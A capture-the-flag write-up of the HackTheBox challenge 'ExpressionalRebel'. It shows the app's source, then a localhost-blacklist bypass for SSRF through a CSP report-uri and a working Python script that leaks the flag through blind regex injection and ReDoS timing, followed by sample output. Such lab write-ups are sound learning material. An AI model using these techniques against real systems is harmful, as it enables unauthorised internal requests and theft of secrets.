---
title: HackTheBox - ExpressionalRebel
author: 0
date: 2023-04-13 18:00:00 +0800
categories: [htb, challenge]
tags: [web, ssrf, blacklist-bypass, blind-regular-expression-injection, redos, regex]
render_with_liquid: false
---

>We created created an AI a couple years ago, but recently became self aware and now is trying to erase humanity, could you stop it?

This is a medium challenge on HackTheBox and contains a website that validates a CSP.

![Homepage](/assets/img/htb-expressionalRebel-homepage.png)

## Enumeration
We get the source code for this challenge, we can look where the flag is being used.

The `validateSecret` constant which contains the flag seems to be called by the `/deactivate` endpoint in the `routes/index.js` file. It looks like this endpoint validates checks if the code provided in a query parameter called `?secretCode=` matches the flag:

```javascript
const path            	= require('path');
const express         	= require('express');
const router          	= express.Router();
const isLocal		  	= require('../middleware/isLocal.middleware')
const {validateSecret} 	= require('../utils');

router.get('/', (req, res) => {
	res.render('home');
});

router.get('/deactivate',isLocal, async (req, res) => {
	const { secretCode } = req.query;
	if (secretCode){
		const success = await validateSecret(secretCode);
		res.render('deactivate', {secretCode, success});
	} else {
		res.render('deactivate', {secretCode});
	}
});

module.exports = router;
```

By looking further through the code, we noticed the most interesting lines of code are located in the `utils/index.js` file. We noticed we could provide a `report-uri` directive that will be validated if it's not a local URL and processed:

```javascript
const regExp		  = require('time-limited-regular-expressions')({ limit: 2 });
const {CspEvaluator}  = require('csp_evaluator/dist/evaluator.js');
const {CspParser}	  = require('csp_evaluator/dist/parser.js');
const {Finding}       = require('csp_evaluator/dist/finding');
const { parse }       = require('url')
const http            = require('http');
const { env }         = require('process');

const isLocalhost = async (url) => {
    let blacklist = [
        "localhost",
        "127.0.0.1",
    ];
    let hostname = parse(url).hostname;
    return blacklist.includes(hostname);
};

const httpGet = url => {
    return new Promise((resolve, reject) => {
        http.get(url, res => {
            res.on('data', () => {
                resolve(true);
            });
        }).on('error', reject);
    });
}

const cspReducer = csp => {
    return Object.values(csp.reduce((r,o) => {
        r[o.directive] = r[o.directive]||{
          directive:o.directive,
          severity:999,
          issues:[]
        }
        r[o.directive].severity = o.severity < r[o.directive].severity ? o.severity : r[o.directive].severity
        r[o.directive].issues.push(o)
        return r
      },{}));
}

const checkReportUri = async uris => {
    if (uris === undefined || uris.length < 1) return
    if (uris.length > 1) {
        return new Finding(405, "Should have only one report-uri", 100, 'report-uri')
    }
    if(await isLocalhost(uris[0])) {
        return new Finding(310, "Destination not available", 50, 'report-uri', uris[0])
    }
    if (uris.length === 1) {
        try {
            available = await httpGet(uris[0])

        } catch (error) {
            return new Finding(310, "Destination not available", 50, 'report-uri', uris[0])
        }
    }

    return
}

const evaluateCsp = async csp => {
    const parsed = new CspParser(csp).csp;
    const reportUris = parsed.directives['report-uri'];

    let evaluatedCsp = new CspEvaluator(parsed).evaluate();
    reportUriFinding = await checkReportUri(reportUris)
    if (reportUriFinding) evaluatedCsp.push(reportUriFinding)
    evaluatedCsp = cspReducer(evaluatedCsp);
    return evaluatedCsp;
}

const validateSecret = async (secret) => {
    try {
        const match = await regExp.match(secret, env.FLAG)
        return !!match;
    } catch (error) {
        return false;
    }
}

module.exports = {
    evaluateCsp,
    validateSecret
}
```

There is constant, `isLocalhost`, that contains a blacklist that checks if a provided URL is `localhost`, it looks like a very limited blacklist. In general, blacklists are discouraged as they are often incomplete and fairly easy to bypass:
```javascript
const isLocalhost = async (url) => {
    let blacklist = [
        "localhost",
        "127.0.0.1",
    ];
    let hostname = parse(url).hostname;
    return blacklist.includes(hostname);
};
```

The other interesting line of code is the use of `time-limited-regular-expressions`, which limits regular expression execution time to 2 seconds. :

```javascript
const regExp = require('time-limited-regular-expressions')({ limit: 2 });
```


The `validatSecret` constant matches the provided `secret` with the `env.FLAG` through a regular expression:
```javascript
const validateSecret = async (secret) => {
    try {
        const match = await regExp.match(secret, env.FLAG)
        return !!match;
    } catch (error) {
        return false;
    }
}
```

## Exploitation

There are a few steps we need to find out before we can go over to finding the flag.

### Bypass the blacklist
We can bypass the blacklist, provide a local URL through the `report-uri` directive and then call the `/deactivate` endpoint.

By reading the blacklist code or by using Burp suite Intruder feature we can use the [Hacktricks - URL format bypass list](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass). We notice that the short notation of localhost `http://127.1` can bypass the blacklist.

```
POST /api/evaluate HTTP/1.1
Host: XXXX
User-Agent: XXXX
...
{"csp":"img-src https: data:;object-src 'none';script-src;report-uri §https://127.0.0.1:80§/deactivate"}
```
_The `§` symbol incidacte the value that will be replaced by the payload list value in Burp._

### Blind regular expression injection
The CSP `report URI` directive accepts an URL with a query parameter `secretCode`, this code will be matched with a **timed regular expression**. This can be exploited to leak sensitive information, similar to a blind SQL injection, and is called a blind regular expression injection attacks attack ([1](https://diary.shift-js.info/blind-regular-expression-injection/), [2](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)). 

>The 'blind regular expression injection attacks' exploit uses a technique known as a ReDoS (regular expression denial-of-service) attack to overwhelm an app's regex engine. This can cause the application to leak sensitive user information, including the length of a secret or even the full value of a secret.
>
>The exploit uses a 'backtracking' feature in the app's regex engine, which allows it to evaluate a regular expression by trying different paths. By carefully crafting a regular expression, an attacker can force the app's regex engine to take a long time to evaluate the expression, causing a time delay. The attacker can then use this time delay to determine the length of a secret.
>
>For example, they could test how long it takes the app's regex engine to evaluate expressions with different lengths, such as `^(?=.{1})((.))salt$, ^(?=.{2})((.)*)*salt$` with 1 as length, and so on. The length of the secret can be revealed by checking the time delay for each expression.

We made a script that uses backtracking to causes an exponential increase in execution time for certain input strings. The vulnerability is exploited by iterating over all possible characters until the server takes more than 2 seconds to respond, indicating the length of the secret or, in the second part of the script, the correct character has been found. If a wrong character is added, the server can determine there is no match faster, resulting in a shorter response time.

```python
import requests
import sys
import re
import time
import urllib
import string

url = sys.argv[1]
headers={"Content-Type":"application/json"}
salt = 'salt$'
secret_length = 0 

def length_is(i):
    return ".{" + str(i) + "}$"

def nth_char_is(i, char):
    return ".{" + str(i-1) + "}" + re.escape(char) + ".*$"

def  redos_if(regexp):
    redos = "^(?={})(((.*)*)*)*{}".format(regexp, salt)
    print(redos)
    return redos

def do_request(code):
    csp = f'report-uri http://127.1:1337/deactivate?secretCode={code}'
    data = {"csp": csp}
    response = requests.post(url+ '/api/evaluate', headers=headers, json=data)
    if response.elapsed.total_seconds() > 2:
        return True
    return False

# find the length of the flag
for i in range(1,50):
    if do_request(urllib.parse.quote_plus(redos_if(length_is(i)))):
        secret_length = i
        print(f"SECRET LENGTH:{i}")
        break

if secret_length == 0:
    print("Secret length not found")
    exit

# find the flag
characters  = string.printable
flag = ""
for i in range(0, secret_length):
    for char in characters:
        if do_request(urllib.parse.quote_plus(redos_if(nth_char_is(i+1, char)))):
            flag += char
        print(flag)
print(f"SECRET: {flag}")
```

### Output
The output below contains a few parts of the output to avoid dumping a bunch of lines. I added this output to show the inner workings of how the script gets to the flag value. You can see the script going through the regex pattern and filling in each character until it reaches an execution time of 2 seconds meaning that the regex contains the right character at that position of the flag. With these findings we can build up the flag value.
```
HTB{b
^(?=.{4}u.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}v.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}w.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}x.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}y.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}z.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}A.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{4}B.*$)(((.*)*)*)*salt$
...
...
...
HTB{b
^(?=.{5}0.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{5}1.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{5}2.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{5}3.*$)(((.*)*)*)*salt$
HTB{b
^(?=.{5}4.*$)(((.*)*)*)*salt$
HTB{b4
...
...
...
HTB{b4
^(?=.{6}8.*$)(((.*)*)*)*salt$
HTB{b4
^(?=.{6}9.*$)(((.*)*)*)*salt$
HTB{b4
^(?=.{6}a.*$)(((.*)*)*)*salt$
HTB{b4
^(?=.{6}b.*$)(((.*)*)*)*salt$
HTB{b4
^(?=.{6}c.*$)(((.*)*)*)*salt$
HTB{b4c
...
...
...
SECRET FLAG: HTB{b4c*REDACTED**nY}
```

